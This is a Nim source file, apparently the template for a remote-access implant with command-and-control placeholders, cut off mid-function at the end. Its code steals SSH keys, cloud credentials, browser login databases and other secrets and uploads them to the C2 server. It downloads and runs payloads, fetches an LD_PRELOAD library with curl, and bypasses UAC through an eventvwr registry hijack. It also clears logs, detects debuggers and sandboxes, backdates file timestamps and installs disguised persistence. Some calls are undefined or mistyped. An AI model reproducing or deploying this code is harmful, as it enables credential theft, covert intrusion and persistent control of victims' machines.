import
  strutils, sequtils, os, osproc, json, httpclient, uri, net, strformat,
  random, times, tables, asyncdispatch, asyncnet, locks, osproc, re,
  streams, mimetypes, algorithm
import nimcrypto except Aes256Key # Assuming external library like nimcrypto for AES
import zip/gzip # Assuming zip package for gzip compression
import zip/tar # Assuming zip package for tar operations

var
  encryptionCtx: ref PacketEncryptionContext
  stealthModeEnabled: bool
  iamgroot: bool
  discoveredLiveHosts: string
  discoverHostsOnce: Once
  results_portscan: Table[string, seq[int]]
  proxyCancelFuncs: Table[string, proc()]
  proxyMutex: Lock
  GlobalIP: string = ""

const
  C2_URL = "https://{lhost}:{lport}"
  CLIENT_ID = "{line}"
  USERNAME = "{username}"
  PASSWORD = "{password}"
  SLEEP = {sleep} * 1000 # Nim uses milliseconds for durations
  MALEABLE = "{maleable}"
  USER_AGENT = "{useragent}"
  MAX_RETRIES = 3
  STEALTH = "{stealth}"
  LHOST = "{lhost}"
  DESIRED_LD_PRELOAD = "/dev/shm/mrhyde.so"

const USER_AGENTS = @[
  "{useragent}",
  "{user_agent_1}",
  "{user_agent_2}",
  "{user_agent_3}",
]

const URLS = @[
  "{url_trafic_1}",
  "{url_trafic_2}",
  "{url_trafic_3}",
]

var HEADERS = initTable[string, string]()
HEADERS["Accept"] = "application/json"
HEADERS["Content-Type"] = "application/json"
HEADERS["Connection"] = "keep-alive"

var debugTools = initTable[string, seq[string]]()
debugTools["windows"] = @["x64dbg", "ollydbg", "ida", "windbg", "processhacker", "csfalcon", "cbagent", "msmpeng"]
debugTools["linux"] = @["gdb", "strace", "ltrace", "radare2"]
debugTools["darwin"] = @["lldb", "dtrace", "instruments"]

type
  Aes256Key = ref object
    Key: seq[byte]

  PacketEncryptionContext = ref object
    AesKey: Aes256Key
    Valid: bool
    Enabled: bool

  LazyDataType = object
    ReverseShellPort: int
    Rhost: string
    DebugImplant: string
    Ports: seq[int]

  HostResult = object
    IP: string
    Alive: bool
    Interface: string

proc randomSelectStr(slice: seq[string]): string =
  randomize()
  let index = rand(slice.len - 1)
  result = slice[index]

proc getGlobalIP(): string =
  let resolvers = @[
    "https://api.ipify.org?format=text",
    "http://myexternalip.com/raw",
    "http://ident.me",
    "https://ifconfig.me",
    "https://ifconfig.co",
  ]
  var ip = ""
  let client = newHttpClient(timeout = 5000)
  defer: client.close()

  while true:
    let url = randomSelectStr(resolvers)
    try:
      ip = client.getContent(url)
      break
    except HttpRequestError, TimeoutError:
      echo "[ERROR] Failed to fetch IP from ", url, ": ", getCurrentExceptionMsg()
    except:
      echo "[ERROR] Unexpected error fetching IP: ", getCurrentExceptionMsg()

  result = ip

proc cleanSystemLogs(lazyconf: LazyDataType): bool =
  var cmd: string
  if getAppFilename().toLowerAscii().contains("windows"):
    cmd = "wevtutil cl System && wevtutil cl Security"
  else:
    cmd = "truncate -s 0 /var/log/syslog /var/log/messages 2>/dev/null"
  
  let shellCommand = getShellCommand("-c")
  let (output, errCode) = execCmdEx(shellCommand[0] & " " & shellCommand[1] & " " & cmd)
  if errCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to clean system logs: {errCode}, output: {output}"
    return false
  if lazyconf.DebugImplant == "True":
    echo "[INFO] System logs cleaned"
  result = true

proc startProxy(lazyconf: LazyDataType, listenAddr, targetAddr: string) {.async.} =
  var ctx: AsyncEvent
  try:
    ctx = newAsyncEvent()
    withLock proxyMutex:
      proxyCancelFuncs[listenAddr] = proc() = ctx.set()
    
    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Starting proxy: listen={listenAddr}, target={targetAddr}"

    let listener = newAsyncSocket()
    listener.bindAddr(parseIpAddress(listenAddr.split(":")[0]), parseInt(listenAddr.split(":")[1]).Port)
    listener.listen()

    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Proxy listening on {listenAddr}, forwarding to {targetAddr}"

    while true:
      if ctx.isSet():
        if lazyconf.DebugImplant == "True":
          echo fmt"[INFO] Stopping proxy on {listenAddr}"
        break
      let client = await listener.accept()
      asyncCheck handleClient(client, targetAddr, lazyconf)
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to start proxy on {listenAddr}: {getCurrentExceptionMsg()}"
  finally:
    listener.close()

proc handleClient(client: AsyncSocket, targetAddr: string, lazyconf: LazyDataType) {.async.} =
  try:
    let target = newAsyncSocket()
    await target.connect(parseIpAddress(targetAddr.split(":")[0]), parseInt(targetAddr.split(":")[1]).Port)
    
    asyncCheck copyStream(target, client)
    asyncCheck copyStream(client, target)
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to connect to target {targetAddr}: {getCurrentExceptionMsg()}"
  finally:
    client.close()

proc stopProxy(listenAddr: string, lazyconf: LazyDataType): bool =
  withLock proxyMutex:
    if proxyCancelFuncs.hasKey(listenAddr):
      proxyCancelFuncs[listenAddr]()
      proxyCancelFuncs.del(listenAddr)
      if lazyconf.DebugImplant == "True":
        echo fmt"[INFO] Proxy stopped on {listenAddr}"
      result = true
    else:
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] No proxy running on {listenAddr}"
      result = false

proc getUsefulSoftware(): seq[string] =
  let binaries = @["docker", "nc", "netcat", "python", "python3", "php", "perl", "ruby", "gcc", "g++", "ping", "base64", "socat", "curl", "wget", "certutil", "xterm", "gpg", "mysql", "ssh"]
  var discovered_software: seq[string]
  for b in binaries:
    let path = findExe(b)
    if path != "":
      discovered_software.add(path)
  result = discovered_software

proc handleAdversary(ctx: AsyncEvent, command: string, lazyconf: LazyDataType, currentPortScanResults: Table[string, seq[int]]): bool =
  try:
    if stealthModeEnabled:
      if lazyconf.DebugImplant == "True":
        echo "[INFO] Adversary command skipped: stealth mode enabled"
      return true

    let idAtomic = command.replace("adversary:", "")
    if idAtomic == "" or idAtomic.len != 36:
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] Invalid id_atomic: {idAtomic}"
      return false

    var scriptExt, scriptPrefix: string
    var shellCommand: seq[string]
    if getAppFilename().toLowerAscii().contains("windows"):
      scriptExt = ".ps1"
      scriptPrefix = "powershell -Command .\\"
      shellCommand = @["powershell", "-Command"]
    else:
      scriptExt = ".sh"
      scriptPrefix = "bash "
      shellCommand = @["bash", "-c"]

    let testScript = fmt"atomic_test_{idAtomic}{scriptExt}"
    let testScriptPath = getCurrentDir() / testScript
    handleDownload(ctx, fmt"download:{testScript}")
    if not fileExists(testScriptPath):
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] Failed to download test script: {testScript}"
      return false

    discard obfuscateFileTimestamps(lazyconf, testScriptPath)

    let executeCtx = newAsyncEvent()
    asyncCheck runScriptAsync(executeCtx, scriptPrefix & testScriptPath, shellCommand, lazyconf)

    let cleanScript = fmt"atomic_clean_test_{idAtomic}{scriptExt}"
    let cleanScriptPath = getTempDir() / cleanScript
    handleDownload(ctx, fmt"download:{cleanScript}")
    if fileExists(cleanScriptPath):
      discard obfuscateFileTimestamps(lazyconf, cleanScriptPath)
      let cleanCtx = newAsyncEvent()
      asyncCheck runScriptAsync(cleanCtx, scriptPrefix & cleanScriptPath, shellCommand, lazyconf)

    removeFile(testScriptPath)
    removeFile(cleanScriptPath)

    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Adversary command completed for id_atomic: {idAtomic}"
    result = true
  except:
    echo fmt"[RECOVER] Error in handleAdversary: {getCurrentExceptionMsg()}"
    return false

proc runScriptAsync(ctx: AsyncEvent, command: string, shellCommand: seq[string], lazyconf: LazyDataType) {.async.} =
  try:
    let cmd = shellCommand.join(" ") & " " & command
    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Executing script: {cmd}"
    let (output, errCode) = execCmdEx(cmd)
    if errCode != 0:
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] Script execution failed: {output}"
      return

    let pid = getCurrentProcessId()
    let hostname = getHostname()
    let ips = getIPs()
    let currentUser = getCurrentUser()
    let jsonData = %*{
      "output": output,
      "client": getAppFilename().toLowerAscii(),
      "command": command,
      "pid": $pid,
      "hostname": hostname,
      "ips": ips.join(", "),
      "user": currentUser,
      "discovered_ips": discoveredLiveHosts,
      "result_portscan": nil
    }
    if lazyconf.DebugImplant == "True":
      echo "[INFO] JSON Data (Formatted):"
      echo $jsonData
    asyncCheck retryRequest(ctx, C2_URL & MALEABLE & CLIENT_ID, "POST", $jsonData, "")
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Script execution failed: {getCurrentExceptionMsg()}"

proc downloadAndExecute(ctx: AsyncEvent, fileURL: string, lazyconf: LazyDataType) {.async.} =
  try:
    var filePath: string
    let client = newAsyncHttpClient(timeout = 30000)
    defer: client.close()

    if getAppFilename().toLowerAscii().contains("windows"):
      let tmpPath = getEnv("APPDATA") & "\\"
      filePath = tmpPath & "payload.exe"
    else:
      let tmpDir = "/dev/shm"
      let fileName = fileURL.extractFilename()
      filePath = tmpDir / fileName

    let resp = await client.get(fileURL)
    if resp.status != $Http200:
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] Failed to download file from {fileURL}, status code: {resp.status}"
      return

    let fileData = await resp.body
    writeFile(filePath, fileData)

    if getAppFilename().toLowerAscii().contains("windows"):
      if not executeUACBypass(filePath, lazyconf):
        if lazyconf.DebugImplant == "True":
          echo fmt"[ERROR] Error executing UAC bypass"
        return
      if lazyconf.DebugImplant == "True":
        echo fmt"[INFO] Payload executed via UAC bypass: {filePath}"
    else:
      discard setFilePermissions(filePath, 0o755)
      let cmd = startProcess(filePath)
      if cmd == nil:
        if lazyconf.DebugImplant == "True":
          echo fmt"[ERROR] Error starting executable {filePath}"
        return
      if lazyconf.DebugImplant == "True":
        echo fmt"[INFO] Background process started: {filePath}"
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Error in downloadAndExecute: {getCurrentExceptionMsg()}"

proc executeUACBypass(filePath: string, lazyconf: LazyDataType): bool =
  if not getAppFilename().toLowerAscii().contains("windows"):
    if lazyconf.DebugImplant == "True":
      echo "[WARNING] UAC bypass is not applicable on non-Windows platforms"
    return false

  let regAdd = execCmdEx(fmt"cmd /Q /C reg add HKCU\\Software\\Classes\\mscfile\\shell\\open\\command /d {filePath}")
  if regAdd.exitCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Error setting registry key: {regAdd.output}"
    return false

  let eventvwr = execCmdEx("cmd /C eventvwr.exe")
  if eventvwr.exitCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Error running eventvwr.exe: {eventvwr.output}"
    return false

  let regDel = execCmdEx("cmd /Q /C reg delete HKCU\\Software\\Classes\\mscfile /f")
  if regDel.exitCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Error deleting registry key: {regDel.output}"
    return false

  result = true

proc obfuscateFileTimestamps(lazyconf: LazyDataType, filePath: string): bool =
  let oldTime = now() - initDuration(days = 365)
  try:
    setLastAccessAndWriteTimes(filePath, oldTime, oldTime)
    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Timestamps obfuscated for {filePath} to {oldTime}"
    result = true
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to obfuscate timestamps for {filePath}: {getCurrentExceptionMsg()}"
    result = false

proc handleExfiltrate(ctx: AsyncEvent, command: string, lazyconf: LazyDataType) {.async.} =
  if lazyconf.DebugImplant == "True":
    echo "[INFO] Executing file scraping..."

  let userObj = getCurrentUser()
  let homeDir = getHomeDir()

  let sensitiveFiles = @[
    homeDir / ".bash_history",
    homeDir / ".ssh" / "id_rsa",
    homeDir / ".ssh" / "id_dsa",
    homeDir / ".ssh" / "id_ecdsa",
    homeDir / ".ssh" / "id_ed25519",
    homeDir / "Desktop" / "*.log",
    homeDir / ".ssh" / "authorized_keys",
    homeDir / ".aws" / "credentials",
    homeDir / ".aws" / "config*",
    homeDir / ".zsh_history",
    homeDir / ".config/fish/fish_history",
    homeDir / ".gnupg" / "secring.gpg",
    homeDir / ".gnupg" / "pubring.gpg",
    homeDir / ".password-store" / "*",
    homeDir / ".keepassxc" / "*.kdbx",
    homeDir / "Documents" / "*.kdbx",
    homeDir / "Downloads" / "github-recovery-codes.txt",
    homeDir / "Descargas" / "github-recovery-codes.txt",
    homeDir / ".config" / "google-chrome" / "Default" / "Login Data",
    homeDir / ".mozilla" / "firefox" / "*" / "key4.db",
    homeDir / ".mozilla" / "firefox" / "*" / "logins.json",
    homeDir / ".config" / "microsoft" / "Edge" / "Default" / "Login Data",
    homeDir / "Library" / "Application Support" / "BraveSoftware" / "*" / "Login Data",
    homeDir / "Library" / "Application Support" / "Google" / "Chrome" / "Default" / "Login Data",
    homeDir / "~/Library/Safari/Bookmarks.plist",
    homeDir / "AppData" / "Local" / "Google" / "Chrome" / "User Data" / "Default" / "Login Data",
    homeDir / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles" / "*" / "key4.db",
    homeDir / "AppData" / "Roaming" / "Mozilla" / "Firefox" / "Profiles" / "*" / "logins.json",
    homeDir / "AppData" / "Local" / "Microsoft" / "Edge" / "User Data" / "Default" / "Login Data",
    homeDir / "AppData" / "Roaming" / "*.ps1_history.txt",
    homeDir / ".purple" / "accounts.xml",
    homeDir / ".irssi" / "config",
    homeDir / ".mutt" / "*",
    homeDir / ".abook" / "abook",
    homeDir / ".thunderbird" / "*" / "prefs.js",
    homeDir / ".thunderbird" / "*" / "Mail" / "*" / "*",
    homeDir / ".wireshark" / "recent",
    homeDir / ".config" / "transmission" / "torrents.json",
    homeDir / ".wget-hsts",
    homeDir / ".git-credentials",
    homeDir / ".npmrc",
    homeDir / ".yarnrc",
    homeDir / ".bundle" / "config",
    homeDir / ".gem" / "*" / "credentials",
    homeDir / ".pypirc",
    homeDir / ".ssh" / "config",
    homeDir / "~/.aws/config",
    homeDir / "~/.oci/config",
    homeDir / "~/.kube/config",
    homeDir / "~/.docker/config.json",
    homeDir / "~/.netrc",
    homeDir / "~/Library/Application Support/com.apple.iChat/Aliases",
    homeDir / "~/Library/Messages/chat.db",
    homeDir / "~/Library/Containers/com.apple.mail/Data/Library/Mail/V*/MailData/Accounts.plist",
    homeDir / "~/Library/Containers/com.apple.Safari/Data/Library/Safari/Bookmarks.plist",
    homeDir / "~/Library/Containers/com.apple.Safari/Data/Library/Safari/History.plist",
    homeDir / "~/Library/Preferences/com.apple.finder.plist",
    homeDir / "~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist",
    homeDir / "~/Library/Application Support/Code/User/settings.json",
    homeDir / "~/Library/Application Support/Slack/local_store.json",
    homeDir / "~/Library/Application Support/Telegram Desktop/tdata/*",
    homeDir / "~/Library/Cookies/Cookies.binarycookies",
  ]

  let passwordPatterns = @[
    re(r"(?i)password\s*[:=]\s*""?(.+?)""?\s*$"),
    re(r"(?i)passwd\s*[:=]\s*""?(.+?)""?\s*$"),
  ]

  var foundFilesChan = newChannel[string](10)
  var errorChan = newChannel[string](5)
  var wg: ThreadPool

  proc scanPath(path: string) {.thread.} =
    try:
      if path.contains("*"):
        let matches = glob(path)
        for match in matches:
          if isSensitiveFile(match, passwordPatterns):
            foundFilesChan.send(match)
      else:
        if isSensitiveFile(path, passwordPatterns):
          foundFilesChan.send(match)
    except:
      errorChan.send(fmt"Error processing path '{path}': {getCurrentExceptionMsg()}")

  for file in sensitiveFiles:
    wg.run(scanPath, file)

  await wg.wait()
  foundFilesChan.close()
  errorChan.close()

  for foundFile in foundFilesChan:
    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Found potentially sensitive file: {foundFile}"
    await uploadFile(ctx, foundFile)

  for err in errorChan:
    echo fmt"[ERROR] Error during file scraping: {err}"

  if lazyconf.DebugImplant == "True":
    echo "[INFO] File scraping finished."

proc compressGzipDir(ctx: AsyncEvent, inputDir, outputFilePath: string, lazyconf: LazyDataType): bool {.async.} =
  if lazyconf.DebugImplant == "True":
    echo fmt"[INFO] Starting directory compression: {inputDir} to {outputFilePath}"

  try:
    let outputFile = open(outputFilePath, fmWrite)
    defer: outputFile.close()

    let gzipWriter = newGzipFileStream(outputFilePath)
    defer: gzipWriter.close()

    let tarWriter = newTarWriter(gzipWriter)
    defer: tarWriter.close()

    for path in walkDirRec(inputDir, yieldFilter = {pcFile}):
      if lazyconf.DebugImplant == "True":
        echo fmt"[DEBUG] Adding file to archive: {path}"

      let file = open(path, fmRead)
      defer: file.close()

      let info = getFileInfo(path)
      let header = tar.FileInfoHeader(info, "")
      let relativePath = path.relativePath(inputDir)
      header.Name = relativePath

      tarWriter.writeHeader(header)
      copy(file, tarWriter)

    if lazyconf.DebugImplant == "True":
      echo fmt"[INFO] Directory compression finished. Uploading: {outputFilePath}"

    await uploadFile(ctx, outputFilePath)
    result = true
  except:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to compress directory '{inputDir}': {getCurrentExceptionMsg()}"
    result = false

proc isSensitiveFile(path: string, passwordPatterns: seq[Regex]): bool =
  let info = getFileInfo(path)
  if info.kind == pcDir or not fileExists(path):
    return false

  let filename = path.extractFilename()
  if filename.contains("id_rsa") or filename.contains("id_dsa") or
     filename.contains("id_ecdsa") or filename.contains("id_ed25519") or
     filename == ".bash_history":
    return true

  try:
    let file = open(path, fmRead)
    defer: file.close()
    for line in file.lines:
      for pattern in passwordPatterns:
        if line.match(pattern):
          return true
  except:
    echo fmt"[WARNING] Could not open file '{path}' for password scanning: {getCurrentExceptionMsg()}"
  result = false

proc uploadFile(ctx: AsyncEvent, filePath: string) {.async.} =
  if not fileExists(filePath):
    echo fmt"[WARNING] File not found for upload: {filePath}"
    return

  try:
    let resp = await retryRequest(ctx, C2_URL & MALEABLE & "/upload", "POST", "", filePath)
    if resp.status == $Http200:
      echo fmt"[INFO] Successfully uploaded file: {filePath.extractFilename()}"
    else:
      echo fmt"[ERROR] Failed to upload file '{filePath}': {resp.status}"
  except:
    echo fmt"[ERROR] Failed to upload file '{filePath}': {getCurrentExceptionMsg()}"

proc portScanner(ips: string, ports: seq[int], timeout: int): Table[string, seq[int]] =
  let ipList = ips.replace(" ", "").split(",")
  echo fmt"[INFO] Starting port scan on {ips} IPs..."
  var results = initTable[string, seq[int]]()
  var resultChan = newChannel[tuple[ip: string, port: int, open: bool]](100)
  var wg: ThreadPool

  proc scan(ip: string, port: int) {.thread.} =
    try:
      let socket = newSocket()
      defer: socket.close()
      socket.connect(ip, Port(port), timeout)
      resultChan.send((ip, port, true))
    except:
      resultChan.send((ip, port, false))

  for ip in ipList:
    for port in ports:
      wg.run(scan, ip, port)

  await wg.wait()
  resultChan.close()

  for res in resultChan:
    if res.open:
      withLock proxyMutex:
        if not results.hasKey(res.ip):
          results[res.ip] = @[]
        results[res.ip].add(res.port)

  result = results

proc isRoot(): bool =
  if getAppFilename().toLowerAscii().contains("linux") or getAppFilename().toLowerAscii().contains("darwin"):
    result = getuid() == 0
  else:
    result = false

proc pingHost(ip, iface: string, timeout: int, results: Channel[HostResult], wg: ThreadPool) {.thread.} =
  try:
    let cmd = fmt"ping -c 1 -W {timeout div 1000} {ip}"
    let (output, errCode) = execCmdEx(cmd)
    results.send(HostResult(IP: ip, Alive: errCode == 0, Interface: iface))
  except:
    echo fmt"[ERROR] Panic in pingHost for {ip}: {getCurrentExceptionMsg()}"

proc generateIPRange(ipNet: string): seq[string] =
  # Simplified; assumes CIDR notation parsing
  let parts = ipNet.split("/")
  let ip = parseIpAddress(parts[0])
  let mask = parseInt(parts[1])
  var ips: seq[string]
  let start = ipToInt(ip)
  let numIPs = 1 shl (32 - mask)
  for i in 0..<numIPs:
    ips.add(intToIP(start + i.uint32).`$`)
  result = ips

proc ipToInt(ip: IpAddress): uint32 =
  let octets = ip.address_v4
  result = (octets[0].uint32 shl 24) or (octets[1].uint32 shl 16) or
           (octets[2].uint32 shl 8) or octets[3].uint32

proc intToIP(n: uint32): IpAddress =
  result = parseIpAddress(fmt"{(n shr 24).byte}.{(n shr 16).byte}.{(n shr 8).byte}.{n.byte}")

proc readJsonFromUrl(url: string, target: var LazyDataType): bool =
  let client = newHttpClient(timeout = 5000, sslContext = newContext(verifyMode = CVerifyNone))
  defer: client.close()
  try:
    let response = client.get(url)
    if response.status.startsWith("2"):
      target = parseJson(response.body).to(LazyDataType)
      result = true
    else:
      echo fmt"[ERROR] Request {url} error code: {response.status}"
      result = false
  except:
    echo fmt"[ERROR] Error reading JSON from {url}: {getCurrentExceptionMsg()}"
    result = false

proc discoverLocalHosts(lazyconf: LazyDataType) =
  var liveHosts: seq[string]
  let timeout = 2000
  var results = newChannel[HostResult]()
  var wg: ThreadPool
  let rhost = lazyconf.Rhost

  let interfaces = getNetworkInterfaces()
  for iface in interfaces:
    if iface.flags.contains("up") and not iface.flags.contains("loopback") and iface.name != "docker0":
      if lazyconf.DebugImplant == "True":
        echo fmt"[DEBUG] Ignoring interface: {iface.name}"
      continue
    for addr in iface.addrs:
      if addr.family == IPv4:
        let subnetIPs = generateIPRange(addr)
        for ip in subnetIPs:
          wg.run(pingHost, ip, iface.name, timeout, results, wg)

  wg.run(pingHost, rhost, "tun0", timeout, results, wg)
  await wg.wait()
  results.close()

  for result in results:
    if result.Alive:
      if lazyconf.DebugImplant == "True":
        echo fmt"[INFO] Discovered Host (Startup): {result.IP} on interface {result.Interface}"
      liveHosts.add(result.IP)
  discoveredLiveHosts = liveHosts.join(", ")

proc isVMByMAC(): bool =
  let interfaces = getNetworkInterfaces()
  let vmMACPrefixes = @["00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00"]
  for iface in interfaces:
    if iface.flags.contains("up") and not iface.flags.contains("loopback") and iface.name != "docker0":
      let mac = iface.hardwareAddr
      for prefix in vmMACPrefixes:
        if mac.startsWith(prefix):
          return true
  result = false

proc ifRoot(lazyconf: LazyDataType): bool =
  if lazyconf.DebugImplant == "True":
    echo "[INFO] Running with root privileges (Linux/macOS)"
  iamgroot = true
  let ldPreload = getEnv("LD_PRELOAD")
  let serv_url = "https://{lhost}/l_{line}"
  let baseCtx = newAsyncEvent()
  asyncCheck downloadAndExecute(baseCtx, serv_url, lazyconf)
  if ldPreload == "" or ldPreload != DESIRED_LD_PRELOAD:
    if not fileExists(DESIRED_LD_PRELOAD):
      discard execCmdEx(fmt"bash -c 'curl -o /home/.grisun0/mrhyde.so http://{LHOST}/mrhyde.so'")
    putEnv("LD_PRELOAD", DESIRED_LD_PRELOAD)
    result = true
  else:
    result = false

proc tryPrivilegeEscalation(lazyconf: LazyDataType) {.async.} =
  if not getAppFilename().toLowerAscii().contains("linux"):
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Privilege escalation check only supported on Linux"
    return

  let shellCommand = getShellCommand("-c")
  let (output, errCode) = execCmdEx(shellCommand.join(" ") & " sudo -n -l")
  if errCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to run sudo -l: {output}"
    return

  if output.contains("(ALL) NOPASSWD"):
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Potential sudo privilege escalation detected: NOPASSWD found"
    let (escalateOutput, escalateErr) = execCmdEx(shellCommand.join(" ") & " sudo -n whoami")
    if escalateErr == 0 and escalateOutput.contains("root"):
      if lazyconf.DebugImplant == "True":
        echo "[SUCCESS] Escalated to root via sudo NOPASSWD"
    else:
      if lazyconf.DebugImplant == "True":
        echo fmt"[ERROR] Failed to escalate via sudo: {escalateOutput}"
  else:
    if lazyconf.DebugImplant == "True":
      echo "[INFO] No NOPASSWD privileges detected"

  checkSetuidBinaries(lazyconf)

proc checkSetuidBinaries(lazyconf: LazyDataType) =
  let shellCommand = getShellCommand("-c")
  let (output, errCode) = execCmdEx(shellCommand.join(" ") & " find / -perm -4000 -type f 2>/dev/null")
  if errCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to check SUID binaries: {output}"
    return

  let exploitableSUID = @["/bin/su", "/usr/bin/passwd", "/usr/bin/gpasswd", "/usr/bin/chsh"]
  var foundSUID = false
  for binary in output.split("\n"):
    for exploit in exploitableSUID:
      if binary.contains(exploit):
        foundSUID = true
        if lazyconf.DebugImplant == "True":
          echo fmt"[INFO] Found exploitable SUID binary: {binary}"
  if not foundSUID:
    if lazyconf.DebugImplant == "True":
      echo "[INFO] No exploitable SUID binaries found"

proc checkDebuggers(lazyconf: LazyDataType): bool =
  var cmd: string
  case getAppFilename().toLowerAscii():
  of "windows":
    cmd = "tasklist"
  of "linux", "darwin":
    cmd = "ps aux"
    if isRoot():
      discard ifRoot(lazyconf)
    else:
      if lazyconf.DebugImplant == "True":
        echo "[INFO] Not running with root privileges (Linux/macOS)"
      iamgroot = false
  else:
    return false

  let shellCommand = getShellCommand("-c")
  let (out, errCode) = execCmdEx(shellCommand.join(" ") & " " & cmd)
  if errCode != 0:
    echo fmt"[ERROR] Failed to run {cmd}: {out}"
    return false

  for tool in debugTools[getAppFilename().toLowerAscii()]:
    if out.toLowerAscii().contains(tool):
      return true
  result = false

proc isSandboxEnvironment(lazyconf: LazyDataType): bool =
  if numCPUs() <= 1:
    return true
  if getTotalMem() < 6 shl 30:
    return true
  if getAppFilename().toLowerAscii().contains("linux"):
    if fileExists("/sys/block/vda") or fileExists("/dev/vda"):
      if lazyconf.DebugImplant == "True":
        echo "[DEBUG] Possible sandbox: Virtual disk detected"
      if fileExists("/proc/self/status"):
        let data = readFile("/proc/self/status")
        if data.contains("TracerPid:"):
          return true
  result = false

proc initEncryptionContext(keyHex: string): ref PacketEncryptionContext =
  try:
    let keyBytes = parseHexStr(keyHex)
    result = PacketEncryptionContext(
      AesKey: Aes256Key(Key: keyBytes),
      Valid: true,
      Enabled: true
    )
  except:
    result = nil

proc initStealthMode(lazyconf: LazyDataType) =
  if STEALTH.toLowerAscii() == "true":
    stealthModeEnabled = true
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Stealth mode initialized as ENABLED"
  else:
    stealthModeEnabled = false
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Stealth mode initialized as DISABLED"

proc handleStealthCommand(command: string, lazyconf: LazyDataType) =
  case command:
  of "stealth_on":
    stealthModeEnabled = true
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Stealth mode ENABLED by command"
  of "stealth_off":
    stealthModeEnabled = false
    if lazyconf.DebugImplant == "True":
      echo "[INFO] Stealth mode DISABLED by command"
  else:
    discard

proc simulateLegitimateTraffic(lazyconf: LazyDataType) {.async.} =
  let client = newAsyncHttpClient()
  defer: client.close()
  while true:
    let userAgent = USER_AGENTS[rand(USER_AGENTS.len - 1)]
    let headers = newHttpHeaders(HEADERS)
    headers["User-Agent"] = userAgent
    let url = URLS[rand(URLS.len - 1)]
    try:
      let resp = await client.get(url, headers = headers)
      if resp.status == $Http200:
        if lazyconf.DebugImplant == "True":
          echo fmt"[INFO] Simulation success: {url}"
      else:
        if lazyconf.DebugImplant == "True":
          echo fmt"[-] Error in the matrix: {resp.status}"
    except:
      if lazyconf.DebugImplant == "True":
        echo fmt"[!] Error during simulation: {getCurrentExceptionMsg()}"
    await sleepAsync(rand(30..60) * 1000)

proc globalRecover() =
  if getCurrentException() != nil:
    echo fmt"[RECOVER] Critical error: {getCurrentExceptionMsg()}"
    restartClient()

proc restartClient() =
  let executable = getAppFilename()
  discard startProcess(executable)
  quit(1)

proc ensureCrontabPersistence(lazyconf: LazyDataType): bool =
  let executable = getAppFilename()
  let cronCmd = fmt"* * * * * {executable}"
  let cron = fmt"echo '{cronCmd}' | crontab -"
  let shellCommand = getShellCommand("-c")
  let (output, errCode) = execCmdEx(shellCommand.join(" ") & " " & cron)
  if errCode != 0:
    if lazyconf.DebugImplant == "True":
      echo fmt"[ERROR] Failed to set crontab persistence: {output}"
    return false
  if lazyconf.DebugImplant == "True":
    echo fmt"[INFO] Successfully set crontab persistence: {cronCmd}"
  result = true

proc ensurePersistenceMacOS(): bool =
  let homeDir = getHomeDir()
  let plistPath = homeDir / "Library/LaunchAgents/com.system.maintenance.plist"
  let executable = getAppFilename()
  let plistContent = fmt"""
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.system.maintenance</string>
    <key>ProgramArguments</key>
    <array>
        <string>{executable}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
  try:
    writeFile(plistPath, plistContent)
    result = true
  except:
    result = false

proc ensurePersistence(lazyconf: LazyDataType): bool =
  let executable = getAppFilename()
  if getAppFilename().toLowerAscii().contains("windows"):
    let taskName = "SystemMaintenanceTask"
    let taskCmd = fmt"schtasks /create /tn \"{taskName}\" /tr \"{executable}\" /sc daily /f"
    let (output, errCode) = execCmdEx(fmt"cmd /C {taskCmd}")
    result = errCode == 0
  elif getAppFilename().toLowerAscii().contains("linux"):
    let serviceContent = fmt"""
[Unit]
Description=System Maintenance Service

[Service]
ExecStart={executable}
Restart=always
User={getEnv("USER")}

[Install]
WantedBy=multi-user.target
"""
    let servicePath = "/etc/systemd/system/system-maintenance.service"
    try:
      writeFile(servicePath, serviceContent)
      discard ensureCrontabPersistence(lazyconf)
      let (output, errCode) = execCmdEx("systemctl enable system-maintenance")
      result = errCode == 0
    except:
      result = false
  elif getAppFilename().toLowerAscii().contains("darwin"):
    result = ensurePersistenceMacOS()
  else:
    result = false

proc selfDestruct(lazyconf: LazyDataType) =
  if lazyconf.DebugImplant == "True":
    echo "[INFO] Initiating self-destruct"
  let executable = getAppFilename()
  removeFile(executable)
  if getAppFilename().toLowerAscii().contains("linux"):
